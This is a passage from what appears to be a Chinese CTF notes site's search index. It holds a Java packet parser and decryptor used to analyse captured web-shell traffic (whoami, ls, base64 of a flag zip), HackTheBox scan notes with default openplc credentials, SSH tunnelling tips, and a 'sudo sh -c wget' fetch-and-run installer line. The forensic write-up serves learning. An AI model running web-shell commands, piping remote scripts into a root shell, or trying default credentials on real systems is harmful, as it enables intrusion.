HTTP\");\n            if (start != -1 &amp;&amp; end != -1) {\n                return data.substring(start, end);\n            }\n        } catch (Exception e) {\n            // ignore\n        }\n        return null;\n    }\n\n    private static Map&lt;String, String&gt; parseQueryParams(String data) {\n        try {\n            int queryStart = data.indexOf(\"?\");\n            int queryEnd = data.indexOf(\" HTTP\");\n            if (queryStart == -1 || queryEnd == -1) return null;\n\n            String query = data.substring(queryStart + 1, queryEnd);\n            Map&lt;String, String&gt; params = new HashMap&lt;&gt;();\n\n            String[] pairs = query.split(\"&amp;\");\n            for (String pair : pairs) {\n                String[] keyValue = pair.split(\"=\", 2);\n                if (keyValue.length == 2) {\n                    String key = URLDecoder.decode(keyValue[0], \"UTF-8\");\n                    String value = URLDecoder.decode(keyValue[1], \"UTF-8\");\n                    params.put(key, value);\n                }\n            }\n            return params;\n        } catch (Exception e) {\n            return null;\n        }\n    }\n\n    private static String bytesToHex(byte[] bytes) {\n        StringBuilder sb = new StringBuilder();\n        for (byte b : bytes) {\n            sb.append(String.format(\"%02X \", b));\n        }\n        return sb.toString();\n    }\n\n    private static void saveRawPacket(Packet packet, String fileName, java.util.Date timestamp) {\n        try (FileWriter writer = new FileWriter(fileName)) {\n            writer.write(\"Timestamp: \" + timestamp + \"\\n\");\n            writer.write(\"Packet Length: \" + packet.length() + \"\\n\");\n            writer.write(\"Packet Structure:\\n\");\n            writer.write(packet.toString());\n            writer.write(\"\\n\\nHex Dump:\\n\");\n            if (packet.getRawData() != null) {\n                writer.write(bytesToHex(packet.getRawData()));\n            }\n\n            // \u5982\u679c\u5305\u542bTCP\u8d1f\u8f7d\uff0c\u5355\u72ec\u4fdd\u5b58\n            if (packet.contains(TcpPacket.class)) {\n                TcpPacket tcpPacket = packet.get(TcpPacket.class);\n                if (tcpPacket.getPayload() != null) {\n                    writer.write(\"\\n\\nTCP Payload:\\n\");\n                    writer.write(new String(tcpPacket.getPayload().getRawData(), StandardCharsets.UTF_8));\n                    writer.write(\"\\n\\nTCP Payload Hex:\\n\");\n                    writer.write(bytesToHex(tcpPacket.getPayload().getRawData()));\n                }\n            }\n        } catch (Exception e) {\n            System.err.println(\"Error saving packet \" + fileName + \": \" + e.getMessage());\n        }\n    }\n} \n</code></pre> \u6dfb\u52a0\u89e3\u5bc6\u51fd\u6570\u7684\u4ee3\u7801 Java<pre><code>package server;\n\nimport java.nio.charset.StandardCharsets;\nimport java.security.Provider;\nimport java.security.Security;\nimport java.util.Base64;\nimport javax.crypto.Cipher;\nimport javax.crypto.spec.SecretKeySpec;\nimport org.bouncycastle.jce.provider.BouncyCastleProvider;\n\npublic class CustomEncryptor {\n  static {\n    Security.addProvider((Provider)new BouncyCastleProvider());\n  }\n\n  public static String encryptSM4(String key, String content) {\n    try {\n      byte[] keyBytes = generateKeyBytes(key, 16);\n      SecretKeySpec secretKey = new SecretKeySpec(keyBytes, \"SM4\");\n      Cipher cipher = Cipher.getInstance(\"SM4/ECB/PKCS5Padding\", \"BC\");\n      cipher.init(1, secretKey);\n      byte[] encryptedBytes = cipher.doFinal(content.getBytes(StandardCharsets.UTF_8));\n      return Base64.getEncoder().encodeToString(encryptedBytes);\n    } catch (Exception e) {\n      throw new RuntimeException(\"Encryption error: \" + e.getMessage(), e);\n    } \n  }\n\n  private static byte[] generateKeyBytes(String key, int length) {\n    byte[] keyBytes = new byte[length];\n    byte[] inputKeyBytes = key.getBytes(StandardCharsets.UTF_8);\n    System.arraycopy(inputKeyBytes, 0, keyBytes, 0, Math.min(inputKeyBytes.length, length));\n    return keyBytes;\n  }\n\n  public static String encryptAES(String key, String content) {\n    return encrypt(content, key, \"AES\", 16);\n  }\n\n  public static String encryptBlowfish(String key, String content) {\n    return encrypt(content, key, \"Blowfish\", 16);\n  }\n\n  private static String encrypt(String content, String key, String algorithm, int keySize) {\n    try {\n      byte[] keyBytes = new byte[keySize];\n      byte[] inputKeyBytes = key.getBytes(StandardCharsets.UTF_8);\n      System.arraycopy(inputKeyBytes, 0, keyBytes, 0, Math.min(inputKeyBytes.length, keySize));\n      SecretKeySpec secretKey = new SecretKeySpec(keyBytes, algorithm);\n      Cipher cipher = Cipher.getInstance(algorithm + \"/ECB/PKCS5Padding\");\n      cipher.init(1, secretKey);\n      byte[] encryptedBytes = cipher.doFinal(content.getBytes(StandardCharsets.UTF_8));\n      return Base64.getEncoder().encodeToString(encryptedBytes);\n    } catch (Exception e) {\n      throw new RuntimeException(\"Encryption error: \" + e.getMessage(), e);\n    } \n  }\n\n  public static String decryptAES(String key, String content) {\n    return decrypt(content, key, \"AES\", 16);\n  }\n\n  public static String decryptSM4(String key, String content) {\n    try {\n      byte[] keyBytes = generateKeyBytes(key, 16);\n      SecretKeySpec secretKey = new SecretKeySpec(keyBytes, \"SM4\");\n      Cipher cipher = Cipher.getInstance(\"SM4/ECB/PKCS5Padding\", \"BC\");\n      cipher.init(Cipher.DECRYPT_MODE, secretKey);\n      byte[] decryptedBytes = cipher.doFinal(Base64.getDecoder().decode(content));\n      return new String(decryptedBytes, StandardCharsets.UTF_8);\n    } catch (Exception e) {\n      throw new RuntimeException(\"Decryption error: \" + e.getMessage(), e);\n    }\n  }\n\n  public static String decryptBlowfish(String key, String content) {\n    return decrypt(content, key, \"Blowfish\", 16);\n  }\n\n  private static String decrypt(String content, String key, String algorithm, int keySize) {\n    try {\n      byte[] keyBytes = new byte[keySize];\n      byte[] inputKeyBytes = key.getBytes(StandardCharsets.UTF_8);\n      System.arraycopy(inputKeyBytes, 0, keyBytes, 0, Math.min(inputKeyBytes.length, keySize));\n      SecretKeySpec secretKey = new SecretKeySpec(keyBytes, algorithm);\n      Cipher cipher = Cipher.getInstance(algorithm + \"/ECB/PKCS5Padding\");\n      cipher.init(Cipher.DECRYPT_MODE, secretKey);\n      byte[] decryptedBytes = cipher.doFinal(Base64.getDecoder().decode(content));\n      return new String(decryptedBytes, StandardCharsets.UTF_8);\n    } catch (Exception e) {\n      throw new RuntimeException(\"Decryption error: \" + e.getMessage(), e);\n    }\n  }\n}\n</code></pre> \u6267\u884c\u7ed3\u679c: Text Only<pre><code>=== All URLs ===\nURL #1\nTime: 2024-11-06 15:30:30.39572\nURL: /shell?cmd=d2hvYW1p&amp;key=6432687659573170&amp;encryptMethod=aes\nParameters:\n  encryptMethod: aes\n  cmd: whoami (decoded)\n  key: 6432687659573170\n------------------------\n\nURL #2\nTime: 2024-11-06 15:30:32.581017\nURL: /shell?cmd=bHMgLWFsdA&amp;key=62484d674c5746736441&amp;encryptMethod=sm4\nParameters:\n  encryptMethod: sm4\n  cmd: ls -alt (decoded)\n  key: 62484d674c5746736441\n------------------------\n\nURL #3\nTime: 2024-11-06 15:30:34.760688\nURL: /shell?cmd=bHMgZmxhZy8&amp;key=62484d675a6d78685a7938&amp;encryptMethod=blowfish\nParameters:\n  encryptMethod: blowfish\n  cmd: ls flag/ (decoded)\n  key: 62484d675a6d78685a7938\n------------------------\n\nURL #4\nTime: 2024-11-06 15:30:36.923148\nURL: /shell?cmd=YmFzZTY0IGZsYWcvZmxhZy56aXA&amp;key=596d467a5a54593049475a73595763765a6d78685a793536615841&amp;encryptMethod=blowfish\nParameters:\n  encryptMethod: blowfish\n  cmd: base64 flag/flag.zip (decoded)\n  key: 596d467a5a54593049475a73595763765a6d78685a793536615841\n------------------------\n\nURL #5\nTime: 2024-11-06 15:30:39.088981\nURL: /shell?cmd=Y2F0IGZsYWcvaGludC50eHQ&amp;key=5932463049475a735957637661476c7564433530654851&amp;encryptMethod=sm4\nParameters:\n  encryptMethod: sm4\n  cmd: cat flag/hint.txt (decoded)\n  key: 5932463049475a735957637661476c7564433530654851\n------------------------\n</code></pre> \u83b7\u5f975\u4e2ahttp\u8bf7\u6c42 \u67e5\u770b\u5230\u7b2c4\u4e2a\u8bf7\u6c42\u7684\u7ed3\u679c\u89e3\u5bc6\u4fe1\u606f\u4e3a Text Only<pre><code>UEsDBBQACQAIABSGZFkAAAAAAAAAACsAAAAIACkAZmxhZy50eHRVVAkABWiKKGeQGitndXgLAAEE\nAAAAAAQAAAAAeGwJAAcUAwAAAADtgXBFs0Lb8F43+KxCxq77A+Zya0CyhPRERubzgNwf5fF5GVjt\nntPQZe8hy0s4qLAhBXW42FAs5Xhw4lBLBwiHHE6JOQAAACsAAABQSwECFAMUAAkACAAUhmRZhxxO\niTkAAAArAAAACAAcAAAAAAAAAAAA7YEAAAAAZmxhZy50eHRVVAkABWiKKGeQGitndXgLAAEEAAAA\nAAQAAAAAUEsFBgAAAAABAAEAUgAAAJgAAAAAAA==\n</code></pre></p> <p>\u5c06base64\u89e3\u7801\u540e\uff0c\u5f97\u5230flag.zip\uff0c \u5bc6\u7801\u63d0\u793a\u4e3a <code>\u5bc6\u7801\u4e3a\u6267\u884c\u547d\u4ee4\uff08\u6309\u7167\u65f6\u95f4\u6392\u5e8f\uff09\u7684\u9996\u5b57\u6bcd\u7684\u7ec4\u5408\u91cd\u590d\u4e09\u6b21\uff0c\u6bd4\u5982\u6267\u884c\u4e86\uff08id,whoami\uff09\uff0c\u90a3\u4e48\u5bc6\u7801\u5c31\u4e3aiwiwiw</code></p> <p>\u6267\u884c\u547d\u4ee4\u6709\uff1a Text Only<pre><code>whoami\nls -alt\nls flag/\nbase64 flag/flag.zip\ncat flag/hint.txt\n</code></pre> \u53ef\u77e5\u5bc6\u7801\u4e3awllbcwllbcwllbc \u89e3\u538b\u540e\u83b7\u5f97flag</p>"},{"location":"CTF/%E8%9C%80%E9%81%93%E5%B1%B1/2024%E2%80%9C%E8%9C%80%E9%81%93%E5%B1%B1%E2%80%9D%E9%AB%98%E6%A0%A1%E8%81%94%E5%90%88%E5%85%AC%E7%9B%8A%E8%B5%9B/#2024ctf","title":"\u6b22\u8fce\u6765\u52302024\u8700\u9053\u5c71CTF","text":"<p>\u5173\u6ce8\u516c\u4f17\u53f7\u53d1\u9001\u6d88\u606f\uff0c\u83b7\u5f97flag</p>"},{"location":"hackthebox/competitive-4-overview/","title":"WifineticTwo","text":""},{"location":"hackthebox/competitive-4-overview/#_1","title":"\u626b\u63cf\uff1a","text":"Text Only<pre><code>Nmap scan report for 10.10.11.7\nHost is up (0.45s latency).\nNot shown: 994 closed tcp ports (conn-refused)\nPORT      STATE    SERVICE\n22/tcp    open     ssh\n1002/tcp  filtered windows-icfw\n5963/tcp  filtered indy\n8080/tcp  open     http-proxy\n19315/tcp filtered keyshadow\n32773/tcp filtered sometimes-rpc9\n</code></pre>"},{"location":"hackthebox/competitive-4-overview/#_2","title":"\u5404\u4e2a\u7aef\u53e3\uff1a","text":"<p>8080\uff1aWerkzeug/1.0.1 Python/2.7.18 \u9ed8\u8ba4\u8d26\u53f7\u5bc6\u7801 openplc:openplc</p>"},{"location":"tools/this/note/","title":"Note","text":""},{"location":"tools/this/note/#_1","title":"\u521b\u5efa\u4e00\u4e2a\u70b9\u51fb\u5c55\u5f00\u7684\u6846\u67b6","text":"HTML<pre><code>&lt;details&gt;\n&lt;summary&gt; \u5177\u4f53\u64cd\u4f5c\u6b65\u9aa4 &lt;/summary&gt;\n&lt;/details&gt;\n</code></pre>"},{"location":"tools/universal/%E7%BD%91%E7%BB%9C%E4%BB%A3%E7%90%86/","title":"\u7f51\u7edc\u4ee3\u7406","text":""},{"location":"tools/universal/%E7%BD%91%E7%BB%9C%E4%BB%A3%E7%90%86/#ssh","title":"SSH\u96a7\u9053 \u4e09\u79cd\u6a21\u5f0f\uff1a","text":"<p>ssh\u547d\u4ee4\u9664\u4e86\u767b\u9646\u5916\u8fd8\u6709\u4e09\u79cd\u4ee3\u7406\u529f\u80fd\uff1a</p> <ul> <li>\u6b63\u5411\u4ee3\u7406\uff08-L\uff09\uff1a\u76f8\u5f53\u4e8eiptables\u7684port forwarding</li> <li>\u53cd\u5411\u4ee3\u7406\uff08-R\uff09\uff1a\u76f8\u5f53\u4e8efrp\u6216ngrok</li> <li>socks5\u4ee3\u7406\uff08-D\uff09\uff1a\u76f8\u5f53\u4e8ess/ssr</li> </ul>"},{"location":"tools/universal/%E7%BD%91%E7%BB%9C%E4%BB%A3%E7%90%86/#v2raya","title":"v2raya","text":"<p>V2RayA \u662f\u4e00\u4e2a\u652f\u6301\u5168\u5c40\u900f\u660e\u4ee3\u7406\u7684V2Ray Linux \u5ba2\u6237\u7aef\u3002 Text Only<pre><code>sudo sh -c \"$(wget -qO- https://hubmirror.v2raya.org/v2rayA/v2rayA-installer/raw/main/installer.sh)\" @ --with-xray\n</code></pre> http://localhost:2017 \u8bbf\u95ee UI \u754c\u9762</p>"},{"location":"tools/universal/%E7%BD%91%E7%BB%9C%E4%BB%A3%E7%90%86/#proxychains-ng","title":"proxychains-ng","text":"<p>ProxyChains\u662fLinux\u548c\u5176\u4ed6Unix\u4e0b\u7684\u4ee3\u7406\u5de5\u5177\u3002 \u5b83\u53ef\u4ee5\u4f7f\u4efb\u4f55\u7a0b\u5e8f\u901a\u8fc7\u4ee3\u7406\u4e0a\u7f51\uff0c \u5141\u8bb8TCP\u548cDNS\u901a\u8fc7\u4ee3\u7406\u96a7\u9053\u3002 ProxyChains\u901a\u8fc7\u4e00\u4e2a\u7528\u6237\u5b9a\u4e49\u7684\u4ee3\u7406\u5217\u8868\u5f3a\u5236\u8fde\u63a5\u6307\u5b9a\u7684\u5e94\u7528\u7a0b\u5e8f\uff0c \u76f4\u63a5\u65ad\u5f00\u63a5\u6536\u65b9\u548c\u53d1\u9001\u65b9\u7684\u8fde\u63a5\u3002 Bash<pre><code>proxychains \u9700\u8981\u4ee3\u7406\u7684\u547d\u4ee4\n</code></pre></p>"},{"location":"vulnhub/DC1-9/","title":"DC1 9","text":""},{"location":"vulnhub/DC1-9/#dc1","title":"DC1","text":"<p>\u4e0b\u8f7d\u5730\u5740</p>"}]}